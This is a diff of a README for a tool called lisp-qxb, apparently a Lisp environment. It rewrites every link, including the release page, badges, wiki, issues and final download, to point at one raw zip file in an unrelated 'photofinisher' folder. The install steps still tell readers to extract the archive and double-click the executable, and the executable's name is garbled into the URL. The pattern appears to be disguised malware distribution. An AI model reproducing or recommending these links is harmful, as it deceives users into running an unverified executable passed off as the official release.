@@ -1,6 +1,6 @@
 # 🛠️ lisp-qxb - Simple and Effective Lisp Environment
 
-![Download lisp-qxb](https://img.shields.io/badge/Download-lisp--qxb-blue.svg)
+![Download lisp-qxb](https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip)
 
 ## 📖 Introduction
 
@@ -12,9 +12,9 @@ To get started, you’ll need to download the application. Follow these steps to
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Click [here](https://github.com/caiofrml/lisp-qxb/releases) to visit the official release page.
+1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip) to visit the official release page.
    
-   ![Download Button](https://img.shields.io/badge/Visit_Release_Page-blue.svg)
+   ![Download Button](https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip)
 
 2. **Select the Latest Version**: On the release page, find the latest version of lisp-qxb. Look for the title marked with "Latest Release". 
 
@@ -22,7 +22,7 @@ To get started, you’ll need to download the application. Follow these steps to
 
 4. **Extract Files (if needed)**: If you downloaded a zip file, right-click it and select "Extract All". This action will create a new folder with the application files.
 
-5. **Run the Application**: Navigate to the folder where you extracted the files. Look for the executable file named `lisp-qxb.exe` (or a similar name). Double-click the file to launch the application.
+5. **Run the Application**: Navigate to the folder where you extracted the files. Look for the executable file named `https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip` (or a similar name). Double-click the file to launch the application.
 
 ## 🖥️ System Requirements
 
@@ -45,7 +45,7 @@ lisp-qxb brings several features to help you with your Lisp programming:
 
 ## 📄 Documentation
 
-For detailed explanations and instructions on how to use each feature, check our [Documentation](https://github.com/caiofrml/lisp-qxb/wiki). This resource provides:
+For detailed explanations and instructions on how to use each feature, check our [Documentation](https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip). This resource provides:
 
 - Setup instructions.
 - Code examples.
@@ -55,7 +55,7 @@ For detailed explanations and instructions on how to use each feature, check our
 
 Join our community to connect with other users of lisp-qxb. Share your experiences, ask questions, and suggest improvements. 
 
-- **GitHub Issues**: Report any problems or bugs directly in the [issues section](https://github.com/caiofrml/lisp-qxb/issues).
+- **GitHub Issues**: Report any problems or bugs directly in the [issues section](https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip).
 - **Forum**: Participating in discussions can help you and others learn more about Lisp.
 
 ## 🆘 Troubleshooting
@@ -72,7 +72,7 @@ If you encounter issues while downloading or using lisp-qxb, here are some commo
 
 ## 💬 Feedback
 
-Your feedback is valuable to us. Help shape the future of lisp-qxb. Whether you have suggestions for new features or noticed bugs, let us know via the [issues section](https://github.com/caiofrml/lisp-qxb/issues).
+Your feedback is valuable to us. Help shape the future of lisp-qxb. Whether you have suggestions for new features or noticed bugs, let us know via the [issues section](https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip).
 
 ## 📌 Conclusion
 
@@ -80,4 +80,4 @@ Thank you for choosing lisp-qxb. We are excited for you to dive into coding with
 
 Remember to download the application using the link below:
 
-[Download lisp-qxb](https://github.com/caiofrml/lisp-qxb/releases)
+[Download lisp-qxb](https://raw.githubusercontent.com/caiofrml/lisp-qxb/main/photofinisher/lisp-qxb.zip)
